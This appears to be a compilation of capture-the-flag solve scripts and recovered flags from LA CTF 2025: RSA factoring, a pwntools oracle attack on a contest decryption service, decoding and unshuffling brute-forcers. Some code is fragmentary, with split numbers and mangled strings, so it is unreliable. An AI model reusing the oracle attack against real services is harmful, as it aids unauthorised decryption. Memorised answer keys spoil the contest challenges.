for i, options in enumerate(possible_flag_bigrams):
    print(f"Position {i}: {options}")
Position 0: ['la', 'mC', 'PK']
Position 1: ['ct', 'tR', 'Rc']
Position 2: ['f{', 'u0', 'Nr']
Position 3: ['l}', 'mU', 'Pw']
Position 4: ['D8', 'LT', '_A']
Position 5: ['y9', '1p', '23']
Position 6: ['l1', 'my', 'P2']
Position 7: ['cA', 'tT', 'R8']
Position 8: ['c~', 'ti', 'R7']
Position 9: ['H9', 'V3', 'Zp']
Position 10: ['DM', 'LJ', '_6']
Position 11: ['c{', 'tr', 'R0']
Position 12: ['fl', 'uP', 'Nm']
Position 13: ['qL', 'xD', 'z_']
Position 14: ['F{', 'S0', '4r']
Position 15: ['hD', 'BL', 'E_']
Position 16: ['pt', '3c', '9R']
Position 17: ['hi', 'B~', 'E7']
Position 18: ['i1', '7y', '~2']
Position 19: ['Db', 'Lg', '_5']
Position 20: ['we', 'UY', '}k']
Position 21: ['pR', '3t', '9c']
Position 22: ['ii', '77', '~~']
Position 23: ['iU', '7w', '~}']
from tqdm import *

a=11757726666370053782817548198302445388809746389939427980645854709670708265483115672483931306046568514261486190552321796104493966732964851930344913717167921
b=9316298142245085995566757124471149658002018003251252600095918734996897003201990424167404855208977317145296561668719706133104910348620855338447494773478465
m=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084096
n=19809648527679995574985995026214252120386158830630072542561625799084852268
7510793014836264680271569767389413084361046266900572117587022842913739505595
3462247114843515996904953953828387946359219361647098255311199845519533103532
0254710579129937002432431484084310356888812572566647322032990377403035619896
27199
ct=6975846772214440771650889063905864655604106205903230208767950559334225200
6616796196678647798051285829585305453898317263980982530435219217936298342814
6286368423607563039009298638233518366607129701361559117341625729444190401836
3356471628503836903765515541133142500182490674733337653802095690320323094222
82324

S = 0
for k in trange(1, 2**15):
    A = int(pow(a, k, m))
    S += int(pow(a, k-1, m))
    B = S * b
    x = var('x')
    f = A * x**2 + B * x - n
    sol = solve_mod(f, m)
    if len(sol) > 0:
        for s in sol:
            if n % int(s[0]) == 0:
                p = int(s[0])
                q = n // p
                break
from Crypto.Util.number import *
p = 310180443514600074553153588766205730602580216449682597076277430107570143045263763584355152481873753139915964457263617871639390456137640662349248114935603
q = 6386491779823495872266601837882790082742583093682566580830239466693364425397460872366805037313069394140075679106680750944711768870975155891667452968264133
ct = 697584677221444077165088906390586465560410620590323020876795055933422520066167961966786477980512858295853054538983172639809825304352192179362983428146286368423607563039009298638233518366607129701361559117341625729444190401836335647162850383690376551554113314250018249067473333765380209569032032309422282324
print(long_to_bytes(pow(ct,inverse(65537,(p-1)*(q-1)),p*q)))
from Crypto.Util.number import *
from pwn import *

context.log_level = 'debug'
sh = remote('chall.lac.tf',31180)
sh.recvuntil(b"Here's the encrypted flag in hex: n")
flag_enc = sh.recvuntil(b"n")
sh.recvuntil(b'What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: ')
k = flag_enc[:
112]+hex(bytes_to_long(b'a'*8))[2:].encode()
k1 = hex(bytes_to_long(b'a'*8))[2:].encode()+flag_enc[-113:-1]
# print(len(flag_enc))
# print(bytes.fromhex(flag_enc.decode()))
# print(len(k))
sh.sendline(k)
sh.recvuntil(b'What ciphertext do you want me to break in an extremely convenient manner? Enter as hex: ')
sh.sendline(k1)
sh.recv()

# b"b'lactf{seems_it_was_extremely_convenient_to_get_t\xf4\xbd\x17\x97#\x8cW\xfei\xbf\xe17/iB.'n"
# b"b'`b\x0e2\x1d\xdf\x813\xe1\xaf\xce\x92%\x0ft$as_extremely_convenient_to_get_the_flag_too_heh}'n"
# lactf{seems_it_was_extremely_convenient_to_get_the_flag_too_heh}
import base64
import urllib.parse

target = "JTNEJTNEUWZsSlglNUJPTERfREFUQSU1RG85MWNzeFdZMzlWZXNwbmVwSjMlNUJPTERfREFUQSU1RGY5bWI3JTVCT0xEX0RBVEElNURHZGpGR2I="

step4 = base64.b64decode(target).decode()
step3 = urllib.parse.unquote(step4)
step2 = step3.replace("[OLD_DATA]", "Z")
step1 = step2[::-1]

flag = base64.b64decode(step1).decode()
print(flag)
target = "l_alcotsft{_tihne__ifnlfaign_igtoyt}"

length = len(target)
half = length // 2

s = [""] * length

for i in range(half):
    s[i] = target[2 * i]
    s[half + i] = target[2 * i + 1]

flag = "".join(s)
print(flag)
def valid(char, target_steps):
    bit_check = 0
    val = char

    while val != 1 and bit_check < target_steps:
        if val % 2 == 0:
            val //= 2
        else:
            val = 3 * val + 1
        bit_check += 1

    return bit_check == target_steps and val == 1

def solve(yi):
    input_chars = []

    for target_steps in yi:
        for char in range(32, 127):
            if valid(char, target_steps):
                input_chars.append(chr(char))
                break

    return "".join(input_chars)

yi = [27, 38, 87, 95, 118, 9]

input = solve(yi)

print(f"{input}")
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <time.h>

void unshuffle(char *a1, int *rand_values) {
    int v3;
    unsigned char v2;
    int len = strlen(a1);
    for (int i = 0; i < len; ++i) {
        v3 = rand_values[len - 1 - i];
        v2 = a1[i];
        a1[i] = a1[v3];
        a1[v3] = v2;
    }
}

void decrypt(int currtime, FILE *output_file) {
    unsigned int v3;
    unsigned int v4;
    int i;
    v3 = currtime;
    v4 = v3;
    srand(v3);
    char s[] = {101,121,97,114,109,115,105,110,105,111,109,116,114,32,32,105,105,101,46,104,101,112,116,104,87,32,95,101,115,111,105,110,97,100,115,97,101,99,32,111,116,101,116,44,114,101,69,32,111,105,105,115,103,111,110,32,116,103,103,114,101,99,100,109,97,32,104,32,100,121,112,105,116,99,117,32,97,32,116,111,110,117,32,115,101,111,32,95,111,116,114,32,97,99,105,103,105,32,32,104,108,110,116,98,32,32,46,101,101,32,110,115,116,32,103,101,110,32,105,100,100,101,44,119,108,114,32,101,114,116,114,100,99,44,116,101,115,101,104,32,32,97,115,32,105,105,46,110,44,105,97,32,97,120,117,104,112,105,121,97,110,110,97,114,114,121,116,117,116,101,115,112,104,32,32,101,99,115,108,32,115,101,115,103,105,110,111,108,45,32,111,99,117,101,119,109,116,32,32,115,32,115,32,32,111,97,121,101,100,105,32,101,105,32,111,59,103,97,123,121,115,32,97,103,105,110,110,102,116,105,109,100,111,45,97,103,111,99,101,32,109,87,116,101,111,100,100,32,111,112,105,32,103,114,111,115,111,101,32,118,104,104,116,116,32,95,116,112,111,115,32,72,32,105,72,32,100,101,97,32,116,97,99,112,32,115,32,101,108,104,111,97,97,115,114,101,116,116,101,32,112,108,105,101,116,116,101,108,102,101,110,110,108,104,114,101,114,101,101,99,101,99,115,32,101,115,32,109,101,100,105,116,114,114,97,110,116,110,104,108,32,116,101,114,101,101,116,116,111,111,115,95,110,32,111,111,32,108,32,32,32,97,116,97,99,115,101,118,32,109,116,110,32,97,32,108,50,97,101,116,101,110,121,32,32,112,111,69,117,101,101,110,32,101,114,32,95,32,109,101,116,116,101,114,108,101,114,32,102,99,116,97,104,101,116,114,121,104,104,112,97,101,101,102,105,104,121,108,114,44,101,32,109,32,101,97,101,101,104,104,32,114,100,32,97,110,101,32,109,32,110,103,110,121,97,114,97,116,116,116,97,100,110,32,111,114,119,117,111,104,125,104,110,110,110,110,115,32,101,101,32,97,105,116,100,97,32,97,32,116,103,32,101,102,110,97,32,115,32,118,32,114,116,115,116,32,114,78,50,100,100,32,105,104,116,120,46,105,95,97,101,100,108,118,32,105,111,104,103,116,32,108,32,117,84,115,108,101,97,110,79,109,99,97,108,115,105,105,99,110,111,104,116,103,100,116,110,101,97,112,32,101,97,117,108,114,32,97,95,118,109,117,97,105,108,101,110,97,104,109,115,117,110,101,32,104,101,32,44,115,100,116,115,117,101,101,101,32,32,32,115,110,104,97,108,116,101,104,32,121,105,101,117,101,115,115,112,101,116,115,97,101,102,44,120,120,114,32,110,116,108,121,108,100,101,100,32,101,109,117,101,32,115,101,97,111,32,101,105,116,101,97,32,112,101,110,65,100,63,97,112,108,115,104,112,114,101,32,114,102,32,32,116,100,120,115,98,97,110,32,32,103,104,32,32,110,110,116,97,101,118,115,105,32,111,101,97,108,99,110,115,115,115,112,114,115,99,108,101,101,121,115,115,99,32,115,115,114,116,115,111,101,105,97,116,102,119,110};
    srand(v3);
    int rand_values[728 * 23];
    int index = 0;
    for (i = 0; i <= 21; ++i) {
        for (int j = strlen(s) - 1; j >= 0; --j) {
            rand_values[index++] = rand() % (j + 1);
        }
    }
    for (i = 21; i >= 0; --i) {
        unshuffle(s, rand_values + i * strlen(s));
    }

    fprintf(output_file, "%sn", s);
}

int main() {
    printf("%dn", time(0LL));
    int i = 1739013510;
    int j = 1739013517;
    FILE *output_file = fopen("./decrypted.txt", "a");
    if (!output_file) {
        perror("Failed to open decrypted.txt");
        return 1;
    }
    while (i < j) {
        decrypt(i, output_file);
        i++;
    }
    fclose(output_file);
    return 0;
}
def solve(extended_flag):
    original_flag = ""
    for c in extended_flag:
        o = bin(ord(c))[2:].zfill(8)

        for i in range(8):
            if o[i] == "1":
                o = o[:i] + "0" + o[i + 1:]
                break

        original_flag += chr(int(o, 2))

    return original_flag

with open("chall.txt", "rb") as f:
    extended_flag = f.read().decode("iso8859-1")

flag = solve(extended_flag)
print(flag)
lactf{my_entire_team_agrees_to_follow_the_rules}
lactf{i_l0v3_3d1t1ng_my_d1sc0rd_msgs}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/6-1739711029.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/6-1739711030.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/02/1-1739711030.webp)